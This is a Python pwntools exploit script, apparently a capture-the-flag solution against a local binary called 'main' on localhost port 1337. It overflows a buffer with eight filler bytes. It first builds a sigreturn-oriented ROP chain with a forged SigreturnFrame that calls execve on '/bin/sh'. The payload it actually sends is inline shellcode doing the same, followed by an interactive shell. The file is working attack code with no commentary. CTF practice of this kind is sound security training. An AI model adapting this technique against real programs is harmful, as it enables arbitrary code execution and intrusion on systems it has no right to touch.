from pwn import *
from icecream import ic

exe = ELF("./main")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''


'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

pop_rax = 0x000000000040103f
syscall = 0x000000000040102b
binsh = 0x0000000000402000

payload = b'a'*8
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload += bytes(frame)
# sl(payload)

payload = b'a'*8
payload += asm('''
mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
    .string "/bin/sh"
''')
sl(payload)
i()
